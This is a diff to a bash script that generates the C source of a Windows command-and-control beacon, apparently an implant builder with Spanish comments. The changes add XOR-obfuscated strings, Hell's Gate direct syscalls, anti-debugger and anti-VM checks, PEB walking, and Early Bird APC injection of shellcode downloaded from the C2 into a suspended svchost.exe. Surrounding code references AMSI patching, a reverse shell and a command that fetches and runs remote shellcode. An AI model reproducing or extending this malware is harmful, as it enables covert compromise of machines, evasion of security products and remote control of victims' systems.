@@ -19,6 +19,11 @@ USER_AGENT1="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML
 USER_AGENT2="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 USER_AGENT3="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 OUTPUT="beacon.exe"
+PROCESS_NAME="C:/Windows/System32/svchost.exe"
+XOR_KEY_HEX="0x33"
+XOR_KEY_DEC="51"
+TIMEOUT=15
+MAX_SIZE=2097152
 
 # === LEER ARGUMENTOS ===
 # Uso: script.sh [TARGET] [URL] [MALEABLE] [CLIENT_ID] ... [OUTPUT]
@@ -42,9 +47,10 @@ show_help() {
     echo "  --user-agent1 UA          User-Agent 1"
     echo "  --user-agent2 UA          User-Agent 2"
     echo "  --user-agent3 UA          User-Agent 3"
+    echo "  --key                     0x33 Clave XOR en hexadecimal (por defecto: $XOR_KEY_HEX)"
     echo "  --output FILE             Nombre del archivo de salida (por defecto: $OUTPUT)"
     echo "  -h, --help                Muestra esta ayuda"
-    echo "  Ejemplo:                  ./gen_beacon.sh --target 192.168.1.50 --url https://c2.ejemplo.com:8443 --maleable /api/v2/submit --client-id win10-pro --c2-host 192.168.1.10 --c2-user AdminC2 --c2-pass "P@ssw0rd_Secret_2025" --c2-port 8443 --aes-key aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899 --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\" --user-agent1 \"Chrome/120.0.0.0 Safari/537.36\" --user-agent2 \"CustomAgent/1.0 (compatible)\" --user-agent3 "BotNet-X/2.5" --output beacon_personalizado.exe"
+    echo "  Ejemplo:                  ./gen_beacon.sh --target 192.168.1.50 --url https://c2.ejemplo.com:8443 --maleable /api/v2/submit --client-id win10-pro --c2-host 192.168.1.10 --c2-user AdminC2 --c2-pass "P@ssw0rd_Secret_2025" --c2-port 8443 --aes-key aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899 --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\" --user-agent1 \"Chrome/120.0.0.0 Safari/537.36\" --user-agent2 \"CustomAgent/1.0 (compatible)\" --user-agent3 "BotNet-X/2.5" --key 0x33 --output beacon_personalizado.exe"
     exit 0
 }
 
@@ -103,6 +109,15 @@ while [[ $# -gt 0 ]]; do
             USER_AGENT3="$2"
             shift 2
             ;;
+        --key)
+            XOR_KEY_HEX="$2"
+            XOR_KEY_DEC=$(printf "%d" $XOR_KEY_HEX 2>/dev/null || echo "51")
+            if ! [[ "$XOR_KEY_DEC" =~ ^[0-9]+$ ]]; then
+                echo "[-] Invalid XOR key after conversion"
+                exit 1
+            fi
+            shift 2
+            ;;            
         --output)
             OUTPUT="$2"
             shift 2
@@ -117,6 +132,25 @@ while [[ $# -gt 0 ]]; do
             ;;
     esac
 done
+
+# === XOR STRING TO BYTES ===
+xor_string() {
+    local str="$1"
+    local key=$2
+    local bytes=()
+    for (( i=0; i<${#str}; i++ )); do
+        local char="${str:$i:1}"
+        local val=$(printf '%d' "'$char")
+        bytes+=($(( val ^ key )))
+    done
+    local IFS=", "
+    echo "${bytes[*]}"
+}
+
+# Generar arrays ofuscados
+OBF_URL_BYTES=$(xor_string "$URL" $XOR_KEY_DEC)
+OBF_PROC_BYTES=$(xor_string "$PROCESS_NAME" $XOR_KEY_DEC)
+OBF_UA_BYTES=$(xor_string "$USER_AGENT" $XOR_KEY_DEC)
 
 # === MOSTRAR CONFIGURACIÓN FINAL ===
 echo "=== CONFIGURACIÓN ACTUAL ==="
@@ -133,6 +167,7 @@ echo "USER_AGENT: $USER_AGENT"
 echo "USER_AGENT1: $USER_AGENT1"
 echo "USER_AGENT2: $USER_AGENT2"
 echo "USER_AGENT3: $USER_AGENT3"
+echo "KEY: $XOR_KEY_HEX"
 echo "OUTPUT: $OUTPUT"
 
 # === GENERAR Makefile ===
@@ -145,12 +180,14 @@ clean:
 EOF
 
 cat > beacon.c << EOF
+#define PSAPI_VERSION 2
+#define WIN32_LEAN_AND_MEAN
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <winnt.h>
 #include <winhttp.h>
-#include <winternl.h>
+
 #include <wincrypt.h>
 #include <ntstatus.h>
 #include <tlhelp32.h>
@@ -165,7 +202,8 @@ cat > beacon.c << EOF
 #include <bcrypt.h>
 #include <shlobj.h>
 #include <objbase.h>
-
+#include <shellapi.h>
+#include <winioctl.h>
 
 #include "aes.h"
 #include "cJSON.h"
@@ -178,11 +216,21 @@ cat > beacon.c << EOF
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "icmpapi.lib")
 #pragma comment(lib, "bcrypt.lib")
-
+#pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "user32.lib")
 // =================================================================================================
 // CONFIGURACIÓN
 // =================================================================================================
 
+// === OFUSCACIÓN DE STRINGS ===
+unsigned char OBF_TARGET_PROCESS[] = { $OBF_PROC_BYTES, 0 };
+unsigned char OBF_USER_AGENT[] = { $OBF_UA_BYTES, 0 };
+
+// === CONFIGURACIÓN ===
+#define XOR_KEY $XOR_KEY_HEX
+#define DEBUG
+#define TIMEOUT $TIMEOUT
+#define MAX_RESPONSE_SIZE $MAX_SIZE
 #define C2_URL "$URL"
 #define MALEABLE "$MALEABLE"
 #define CLIENT_ID "$CLIENT_ID"
@@ -190,8 +238,6 @@ cat > beacon.c << EOF
 #define MIN_JITTER 30    // 30%
 #define MAX_JITTER 60    // 60%
 #define MAX_RETRIES 3
-#define TIMEOUT 15000    // ms
-#define MAX_RESPONSE_SIZE (2 * 1024 * 1024)
 #define C2_HOST "$C2_HOST"
 #define LC2_HOST L"$C2_HOST"
 #define C2_USER "$C2_USER"
@@ -221,6 +267,17 @@ cat > beacon.c << EOF
 #define SECURITY_FLAG_IGNORE_INVALID_POLICY   0x00000020
 #endif
 
+#ifndef _PROCESS_BASIC_INFORMATION_
+#define _PROCESS_BASIC_INFORMATION_
+
+
+#endif
+
+// Also define the ProcessInformationClass constant if not present
+#ifndef ProcessBasicInformation
+#define ProcessBasicInformation 0
+#endif
+
 #define CHECK_ERROR(cond, msg) \
     do { \
         if (!(cond)) { \
@@ -228,6 +285,16 @@ cat > beacon.c << EOF
             return FALSE; \
         } \
     } while(0)
+
+
+typedef struct _PROCESS_BASIC_INFORMATION {
+    LONG ExitStatus;
+    PVOID PebBaseAddress;
+    ULONG_PTR AffinityMask;
+    LONG BasePriority;
+    ULONG_PTR UniqueProcessId;
+    ULONG_PTR InheritedFromUniqueProcessId;
+} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;
 
 
 typedef struct {
@@ -323,6 +390,40 @@ const char* TRAFFIC_UAS[] = {
 // =================================================================================================
 // NTAPI Definitions
 // =================================================================================================
+
+// === ESTRUCTURAS NECESARIAS (MinGW-safe) ===
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+typedef struct _LDR_DATA_TABLE_ENTRY {
+    LIST_ENTRY InMemoryOrderLinks;
+    LIST_ENTRY InInitializationOrderLinks;
+    PVOID DllBase;
+    PVOID EntryPoint;
+    ULONG SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
+
+typedef struct _PEB_LDR_DATA {
+    DWORD Length;
+    DWORD Initialized;
+    PVOID SsHandle;
+    LIST_ENTRY InMemoryOrderModuleList;
+    LIST_ENTRY InInitializationOrderModuleList;
+    LIST_ENTRY InLoadOrderModuleList;
+} PEB_LDR_DATA, *PPEB_LDR_DATA;
+
+typedef struct _PEB {
+    BYTE Reserved1[2];
+    BYTE BeingDebugged;
+    BYTE Reserved2[1];
+    PVOID Reserved3[2];
+    PPEB_LDR_DATA Ldr;
+} PEB, *PPEB;
 
 #ifndef NTSTATUS
 typedef LONG NTSTATUS;
@@ -432,9 +533,76 @@ BOOL isValidUUID(const char* uuid);
 unsigned char* DownloadToBuffer(const char* url, DWORD* fileSize);
 BOOL is_64bit(BYTE* buffer);
 BOOL FileExistsA(const char* filePath);
-unsigned char* parse_shellcode_from_c(const char* content, DWORD* out_size);
+
 void __cdecl ReverseShell(void* arg);
 void cleanupProxy();
+// === HELL'S GATE + HELLDESCENT ===
+static volatile DWORD __syscall_ssn = 0;
+
+DWORD GetSyscallNumber(PVOID func_addr) {
+    if (!func_addr) return 0;
+    BYTE* addr = (BYTE*)func_addr;
+    for (int i = 0; i < 32; i++) {
+        if (addr[i] == 0xB8) {
+            return *(DWORD*)(addr + i + 1) & 0xFFFF;
+        }
+        if (addr[i] == 0xC3) break;
+    }
+    return 0;
+}
+
+DWORD HellsGate(DWORD ssn) {
+    __syscall_ssn = ssn;
+    return ssn;
+}
+
+__attribute__((naked))
+NTSTATUS HellDescent(
+    DWORD64 arg1, DWORD64 arg2, DWORD64 arg3,
+    DWORD64 arg4, DWORD64 arg5, DWORD64 arg6
+) {
+    __asm__ volatile (
+        "movq %%rcx, %%r10\n\t"
+        "movl __syscall_ssn(%%rip), %%eax\n\t"
+        "syscall\n\t"
+        "ret\n\t"
+        :
+        :
+        : "rax", "r10", "rcx"
+    );
+}
+
+// === XOR ===
+void xor_string(char* data, size_t len, char key) {
+    for (int i = 0; i < len; i++) {
+        data[i] ^= key;
+    }
+}
+
+// === ANTI-ANALYSIS ===
+BOOL anti_analysis() {
+    if (IsDebuggerPresent()) {
+        printf("[-] Debugger detectado.\n");
+        fflush(stdout);
+        return TRUE;
+    }
+
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\\\DESCRIPTION\\\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        char buffer[256];
+        DWORD size = sizeof(buffer);
+        if (RegQueryValueExA(hKey, "SystemBiosVersion", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+            if (strstr(buffer, "VMWARE") || strstr(buffer, "VBOX") || strstr(buffer, "QEMU") || strstr(buffer, "XEN")) {
+                printf("[-] Entorno virtualizado detectado.\n");
+                fflush(stdout);
+                RegCloseKey(hKey);
+                return TRUE;
+            }
+        }
+        RegCloseKey(hKey);
+    }
+    return FALSE;
+}
 
 BOOL load_lazyconf() {
     const char* url = "$URL/config.json";
@@ -674,6 +842,54 @@ BOOL load_lazyconf() {
     return FALSE;
 }
 
+HMODULE GetNtdllBase() {
+    printf("[*] Buscando ntdll.dll...\n");
+    fflush(stdout);
+
+    PEB* peb;
+#ifdef _WIN64
+    __asm__ volatile ("movq %%gs:0x60, %0" : "=r" (peb));
+#else
+    __asm__ volatile ("movl %%fs:0x30, %0" : "=r" (peb));
+#endif
+
+    if (!peb || !peb->Ldr) return NULL;
+
+    LIST_ENTRY* list = peb->Ldr->InMemoryOrderModuleList.Flink;
+    LIST_ENTRY* head = list;
+
+    do {
+        LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)list - 0x10);
+        if (entry->BaseDllName.Length == 20 && entry->BaseDllName.Buffer) {
+            if (entry->BaseDllName.Buffer[0] == L'n' &&
+                entry->BaseDllName.Buffer[1] == L't' &&
+                entry->BaseDllName.Buffer[2] == L'd' &&
+                entry->BaseDllName.Buffer[3] == L'l' &&
+                entry->BaseDllName.Buffer[4] == L'l' &&
+                entry->BaseDllName.Buffer[5] == L'.' &&
+                entry->BaseDllName.Buffer[6] == L'd' &&
+                entry->BaseDllName.Buffer[7] == L'l' &&
+                entry->BaseDllName.Buffer[8] == L'l') {
+                printf("[+] ntdll.dll encontrado en: 0x%p\n", entry->DllBase);
+                fflush(stdout);
+                return (HMODULE)entry->DllBase;
+            }
+        }
+        list = list->Flink;
+    } while (list != head);
+
+    HMODULE h = GetModuleHandleA("ntdll.dll");
+    if (h) {
+        printf("[+] ntdll.dll obtenido con fallback: 0x%p\n", h);
+        fflush(stdout);
+        return h;
+    }
+
+    printf("[-] No se pudo encontrar ntdll.dll\n");
+    fflush(stdout);
+    return NULL;
+}
+
 BOOL isVMByMAC() {
     printf("[*] Checking if running in a VM by MAC address...\n");
     fflush(stdout);
@@ -744,6 +960,36 @@ BOOL isVMByMAC() {
     return FALSE;
 }
 
+// === EXTRAER SHELLCODE ===
+int extract_shellcode(const char* input, size_t len, unsigned char** out) {
+    *out = NULL;
+    unsigned char* sc = malloc(1024);
+    size_t capacity = 1024;
+    size_t count = 0;
+
+    for (size_t i = 0; i < len - 3; i++) {
+        if (input[i] == '\\\\' && input[i+1] == 'x' && i+3 < len) {
+            char hex[3] = { input[i+2], input[i+3], '\\0' };
+            char* end;
+            long val = strtol(hex, &end, 16);
+            if (end == hex + 2 && val >= 0 && val <= 255) {
+                if (count >= capacity) {
+                    capacity *= 2;
+                    unsigned char* tmp = realloc(sc, capacity);
+                    if (!tmp) { free(sc); return -1; }
+                    sc = tmp;
+                }
+                sc[count++] = (unsigned char)(val ^ XOR_KEY);
+                i += 3;
+            }
+        }
+    }
+
+    if (count == 0) { free(sc); return 0; }
+    *out = sc;
+    return count;
+}
+
 
 // Función para convertir hex a bytes
 BYTE hex_char_to_byte(char c) {
@@ -759,7 +1005,8 @@ void hex_to_bytes(const char* hex, BYTE* output, size_t len) {
     }
 }
 
-void executeLoader(const char* url) {
+void executeLoader(void *arg){
+    const char *url = (const char *)arg; 
     printf("[*] executeLoader: downloading shellcode from %s\n", url);
     fflush(stdout);
 
@@ -780,8 +1027,13 @@ void executeLoader(const char* url) {
     content[fileSize] = '\0';
     free(raw_content);
 
-    DWORD shellcodeSize = 0;
-    unsigned char* shellcode = parse_shellcode_from_c(content, &shellcodeSize);
+    unsigned char* shellcode = NULL;
+    DWORD shellcodeSize = extract_shellcode(content, strlen(content), &shellcode);
+    if (shellcodeSize <= 0) {
+        printf("[-] Failed to extract shellcode\n");
+        free(content);
+        return;
+    }
     free(content);
 
     if (!shellcode || shellcodeSize == 0) {
@@ -2311,10 +2563,13 @@ BOOL DecryptPacket(BYTE* buffer, DWORD* buffer_len) {
     
     return TRUE;
 }
+
 char* GetIPs() {
     printf("[*] getips...\n");
     fflush(stdout);
     char* ips = malloc(1024);
+    if (!ips) return NULL; // Verificar malloc
+    
     ips[0] = '\0';
     PIP_ADAPTER_INFO adapterInfo = NULL;
     PIP_ADAPTER_INFO adapter = NULL;
@@ -2322,6 +2577,11 @@ char* GetIPs() {
 
     GetAdaptersInfo(adapterInfo, &len);
     adapterInfo = (IP_ADAPTER_INFO*)malloc(len);
+    if (!adapterInfo) {
+        free(ips); // Limpiar si falla
+        return NULL;
+    }
+    
     if (GetAdaptersInfo(adapterInfo, &len) == NO_ERROR) {
         adapter = adapterInfo;
         while (adapter) {
@@ -2332,29 +2592,45 @@ char* GetIPs() {
             adapter = adapter->Next;
         }
     }
-    if (adapterInfo) free(adapterInfo);
-    return ips;
+    
+    free(adapterInfo);
+    return ips; // El que llama debe hacer free(ips)
 }
+
 
 char* GetHostname() {
     printf("[*] gethostname...\n");
     fflush(stdout);
+    
     char* hostname = malloc(256);
+    if (!hostname) return NULL; // Verificar malloc
+    
     DWORD size = 256;
-    GetComputerNameA(hostname, &size);
-    return hostname;
+    if (!GetComputerNameA(hostname, &size)) {
+        free(hostname); // Limpiar si falla GetComputerNameA
+        return NULL;
+    }
+    
+    return hostname; // El que llama debe hacer free(hostname)
 }
 
 char* GetUsername() {
     printf("[*] getusername...\n");
     fflush(stdout);
+    
     char* username = malloc(256);
+    if (!username) return NULL; // Verificar malloc
+    
     DWORD size = 256;
-    GetUserNameA(username, &size);
-    return username;
+    if (!GetUserNameA(username, &size)) {
+        free(username); // Limpiar si falla GetUserNameA
+        return NULL;
+    }
+    
+    return username; // El que llama debe hacer free(username)
 }
 
-// Esta versión está duplicada
+
 BOOL patchAMSI(void) {
     printf("[*] amsi...\n");
     fflush(stdout);
@@ -3007,123 +3283,177 @@ void PortScannerWrapper(void* arg) {
 // Early Bird APC Injection
 // =================================================================================================
 
-unsigned char* parse_shellcode_from_c(const char* content, DWORD* out_size) {
-    *out_size = 0;
 
-    const char* start = strstr(content, "buf[] =");
-    if (!start) return NULL;
 
-    start = strchr(start, '"');
-    if (!start) return NULL;
-
-    DWORD max_len = 0;
-    const char* ptr = start;
-    while ((ptr = strstr(ptr, "\\\\x"))) {
-        max_len++;
-        ptr += 2;
-    }
-
-    if (max_len == 0) return NULL;
-
-    unsigned char* shellcode = (unsigned char*)malloc(max_len);
-    if (!shellcode) return NULL;
-
-    DWORD len = 0;
-    ptr = start;
-    char hex_byte[3] = {0};
-
-    while ((ptr = strstr(ptr, "\\\\x"))) {
-        if (len >= max_len) break;
-        memcpy(hex_byte, ptr + 2, 2);
-        shellcode[len++] = (BYTE)strtoul(hex_byte, NULL, 16);
-        ptr += 2;
-    }
-
-    *out_size = len;
-    return shellcode;
-}
-
+// === INYECCIÓN EARLY BIRD + SYSCALL ===
 BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
-    printf("[*] EarlyBirdInject: Starting injection...\n");
-    fflush(stdout);
-
-    if (!shellcode || shellcode_len <= 0) {
-        printf("[-] Invalid shellcode\n");
+    if (anti_analysis()) {
+        printf("[-] Entorno de análisis detectado. Saliendo.\n");
+        fflush(stdout);
         return FALSE;
     }
-
     STARTUPINFOA si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(STARTUPINFOA);
-    char target[] = "C:\\\\Windows\\\\System32\\\\svchost.exe";
 
-    if (!CreateProcessA(NULL, target, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-        printf("[-] CreateProcessA failed: %lu\n", GetLastError());
+    printf("[*] Intentando crear proceso: %s\n", OBF_TARGET_PROCESS);
+    fflush(stdout);
+
+    if (!CreateProcessA(
+        (char*)OBF_TARGET_PROCESS,
+        NULL,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_SUSPENDED,
+        NULL,
+        NULL,
+        &si,
+        &pi
+    )) {
+        DWORD err = GetLastError();
+        printf("[-] CreateProcessA falló para %s: %lu\n", OBF_TARGET_PROCESS, err);
+        fflush(stdout);
+
         return FALSE;
     }
 
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    if (!ntdll) {
-        printf("[-] Failed to get ntdll\n");
-        goto cleanup;
-    }
-
-    // Tipos de funciones de ntdll
-    typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
-    typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
-    typedef NTSTATUS (NTAPI *RtlCreateUserThread_t)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PVOID, PVOID, PHANDLE, PCLIENT_ID);
-
-    NtAllocateVirtualMemory_t pAlloc = (NtAllocateVirtualMemory_t)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
-    NtWriteVirtualMemory_t    pWrite = (NtWriteVirtualMemory_t)   GetProcAddress(ntdll, "NtWriteVirtualMemory");
-    RtlCreateUserThread_t     pRtlCreateThread = (RtlCreateUserThread_t)GetProcAddress(ntdll, "RtlCreateUserThread");
-
-    if (!pAlloc || !pWrite || !pRtlCreateThread) {
-        printf("[-] Failed to get required NTDLL functions\n");
-        goto cleanup;
-    }
-
-    // Asignar memoria en proceso remoto
-    LPVOID pRemoteMem = NULL;
-    SIZE_T size = (SIZE_T)shellcode_len;
-
-    if (!NT_SUCCESS(pAlloc(pi.hProcess, &pRemoteMem, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
-        printf("[-] NtAllocateVirtualMemory failed\n");
-        goto cleanup;
-    }
-
-    // Escribir shellcode
-    if (!NT_SUCCESS(pWrite(pi.hProcess, pRemoteMem, shellcode, shellcode_len, NULL))) {
-        printf("[-] NtWriteVirtualMemory failed\n");
-        goto cleanup;
-    }
-
-    // Crear hilo remoto
-    HANDLE hRemoteThread = NULL;
-    NTSTATUS status = pRtlCreateThread(pi.hProcess, NULL, FALSE, 0, 0, 0, pRemoteMem, NULL, &hRemoteThread, NULL);
-    if (!NT_SUCCESS(status)) {
-        printf("[-] RtlCreateUserThread failed: 0x%08X\n", status);
-        goto cleanup;
-    }
-
-    printf("[+] Shellcode thread created at: 0x%p\n", pRemoteMem);
+    printf("[+] Proceso suspendido creado: PID=%lu\n", pi.dwProcessId);
     fflush(stdout);
 
-    // Cerrar handles
-    CloseHandle(hRemoteThread);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-    return TRUE;
+    HANDLE hProcess = pi.hProcess;
+    HANDLE hThread = pi.hThread;
 
-cleanup:
-    if (pi.hThread) {
-        ResumeThread(pi.hThread); // Evita que el proceso quede colgado
-        CloseHandle(pi.hThread);
-    }
-    if (pi.hProcess) {
+    HMODULE ntdll = GetNtdllBase();
+    if (!ntdll) {
+        printf("[-] No se pudo obtener ntdll.dll\n");
+        fflush(stdout);
+
         TerminateProcess(pi.hProcess, 1);
+        CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
+        return FALSE;
     }
-    return FALSE;
+
+    PVOID pNtAllocateVirtualMemory = GetProcAddress(ntdll, "NtAllocateVirtualMemory");
+    PVOID pNtWriteVirtualMemory   = GetProcAddress(ntdll, "NtWriteVirtualMemory");
+    PVOID pNtQueueApcThread       = GetProcAddress(ntdll, "NtQueueApcThread");
+    PVOID pNtResumeThread         = GetProcAddress(ntdll, "NtResumeThread");
+
+    if (!pNtAllocateVirtualMemory || !pNtWriteVirtualMemory || !pNtQueueApcThread || !pNtResumeThread) {
+        printf("[-] No se pudieron obtener funciones de ntdll\n");
+        fflush(stdout);
+
+        TerminateProcess(pi.hProcess, 1);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return FALSE;
+    }
+
+    DWORD ssn_alloc = GetSyscallNumber(pNtAllocateVirtualMemory);
+    DWORD ssn_write = GetSyscallNumber(pNtWriteVirtualMemory);
+    DWORD ssn_apc   = GetSyscallNumber(pNtQueueApcThread);
+    DWORD ssn_resume = GetSyscallNumber(pNtResumeThread);
+
+    if (!ssn_alloc || !ssn_write || !ssn_apc || !ssn_resume) {
+        printf("[-] No se pudo obtener SSN de alguna función\n");
+        fflush(stdout);
+
+        TerminateProcess(pi.hProcess, 1);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return FALSE;
+    }
+
+    SIZE_T size = (shellcode_len + 4095) & ~4095;
+    LPVOID pRemoteMem = NULL;
+
+    // 🔹 NtAllocateVirtualMemory (syscall)
+    HellsGate(ssn_alloc);
+    NTSTATUS status = HellDescent(
+        (DWORD64)hProcess,
+        (DWORD64)&pRemoteMem,
+        0,
+        (DWORD64)&size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE
+    );
+    if (status != STATUS_SUCCESS) {
+        printf("[-] NtAllocateVirtualMemory falló: 0x%08lX\n", (unsigned long)status);
+        fflush(stdout);
+
+        TerminateProcess(pi.hProcess, 1);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return FALSE;
+    }
+    printf("[+] Memoria remota asignada: 0x%p\n", pRemoteMem);
+    fflush(stdout);
+
+    // 🔹 WriteProcessMemory (API normal, más estable que NtWriteVirtualMemory syscall)
+    if (!WriteProcessMemory(hProcess, pRemoteMem, shellcode, shellcode_len, NULL)) {
+        printf("[-] WriteProcessMemory falló: %lu\n", GetLastError());
+        fflush(stdout);
+
+        TerminateProcess(pi.hProcess, 1);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return FALSE;
+    }
+
+    printf("[+] Shellcode escrito en proceso remoto.\n");
+    fflush(stdout);
+
+    // 🔹 VirtualProtectEx (API normal) - más discreto que NtProtectVirtualMemory
+    ULONG oldProtect = 0;
+    if (!VirtualProtectEx(hProcess, pRemoteMem, size, PAGE_EXECUTE_READ, &oldProtect)) {
+        printf("[-] VirtualProtectEx falló: %lu\n", GetLastError());
+        fflush(stdout);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return FALSE;
+    }
+    printf("[+] Protección cambiada a PAGE_EXECUTE_READ.\n");
+    fflush(stdout);
+
+    // 🔹 NtQueueApcThread (syscall)
+    HellsGate(ssn_apc);
+    status = HellDescent(
+        (DWORD64)hThread,
+        (DWORD64)pRemoteMem,
+        0, 0, 0, 0
+    );
+    if (status != STATUS_SUCCESS) {
+        printf("[-] NtQueueApcThread falló: 0x%08lX\n", (unsigned long)status);
+        fflush(stdout);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return FALSE;
+    }
+    printf("[+] APC enqueued via NtQueueApcThread.\n");
+    fflush(stdout);
+
+    // 🔹 NtResumeThread (syscall)
+    DWORD suspendCount;
+    HellsGate(ssn_resume);
+    status = HellDescent(
+        (DWORD64)hThread,
+        (DWORD64)&suspendCount,
+        0, 0, 0, 0
+    );
+    if (status != STATUS_SUCCESS) {
+        printf("[-] NtResumeThread falló: 0x%08lX\n", (unsigned long)status);
+        fflush(stdout);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return FALSE;
+    }
+    printf("[+] Hilo reanudado. Payload en ejecución.\n");
+    fflush(stdout);
+
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    return TRUE;
 }
 
 
@@ -4081,7 +4411,10 @@ void handleAdversary(char* command) {
 
     if (strncmp(command, "shellcode:", 10) == 0) {
         char* url = command + 10;
-        _beginthread((void(*)(void*))executeLoader, 0, (void*)url);
+        uintptr_t th = _beginthread(executeLoader, 0, _strdup(url));
+        if (th == (uintptr_t)-1) {
+            printf("[-] Failed to spawn loader thread\n");
+        }
         snprintf(output, sizeof(output), "Shellcode loading: %s", url);
         goto send_response;
     }
@@ -4391,6 +4724,8 @@ int main() {
     printf("[*] main niam...\n");
     fflush(stdout);
     srand(time(NULL));
+    xor_string((char*)OBF_TARGET_PROCESS, sizeof(OBF_TARGET_PROCESS)-1, XOR_KEY);
+    xor_string((char*)OBF_USER_AGENT, sizeof(OBF_USER_AGENT)-1, XOR_KEY);
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     hex_to_bytes(aes_key_hex, aes_key, 32);
     // Cargar configuración
